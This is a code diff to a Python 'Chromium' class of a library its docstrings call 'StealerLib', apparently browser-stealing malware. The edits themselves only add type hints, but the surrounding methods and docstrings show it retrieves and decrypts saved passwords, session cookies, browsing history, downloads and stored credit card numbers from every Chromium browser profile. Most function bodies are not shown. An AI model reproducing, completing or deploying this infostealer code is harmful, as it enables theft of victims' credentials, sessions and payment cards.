@@ -59,7 +59,7 @@ class Chromium:
         self.chromium_history = []
         self.chromium_banking = []
 
-    def cget(self, func: callable, conv: bool=True) -> list:
+    def cget(self, func: callable, conv: Optional[bool]=True) -> list:
         temp_data = []
 
         for _, path in self.browsers.items():
@@ -126,7 +126,12 @@ class Chromium:
 
         return decrypted_pass
 
-    def _chromium_passwords(self, path: str, profile: str, conv: bool=True) -> list:
+    def _chromium_passwords(
+        self,
+        path: str,
+        profile: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Login]]:
         """Retrieves the site url, username and password from the passed Chromium browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
@@ -137,7 +142,7 @@ class Chromium:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -169,7 +174,12 @@ class Chromium:
 
         return self.chromium_passwords
 
-    def _chromium_cookies(self, path: str, profile: str, conv: bool=True):
+    def _chromium_cookies(
+        self,
+        path: str,
+        profile: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Cookie]]:
         """Retrieves the site host, cookie name, value and various other information from the passed Chromium browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
@@ -180,7 +190,7 @@ class Chromium:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
+            list: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -212,7 +222,12 @@ class Chromium:
 
         return self.chromium_cookies
 
-    def _chromium_history(self, path: str, profile: str, conv: bool=True) -> list:
+    def _chromium_history(
+        self,
+        path: str,
+        profile: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Site]]:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -223,7 +238,7 @@ class Chromium:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -253,7 +268,12 @@ class Chromium:
 
         return self.chromium_history
 
-    def _chromium_downloads(self, path: str, profile: str, conv: bool=True) -> list:
+    def _chromium_downloads(
+        self,
+        path: str,
+        profile: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Download]]:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -264,7 +284,7 @@ class Chromium:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
+            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
@@ -294,7 +314,12 @@ class Chromium:
 
         return self.chromium_downloads
 
-    def _chromium_credit_cards(self, path: str, profile: str, conv: bool=True) -> list:
+    def _chromium_credit_cards(
+        self,
+        path: str,
+        profile: str,
+        conv: Optional[bool]=True
+    ) -> list[Union[list, BrowserTypes.Card]]:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Chromium browser -
            by connecting to its database file and parsing the needed data
 
@@ -305,7 +330,7 @@ class Chromium:
             conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
+            list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             chromium = Chromium()
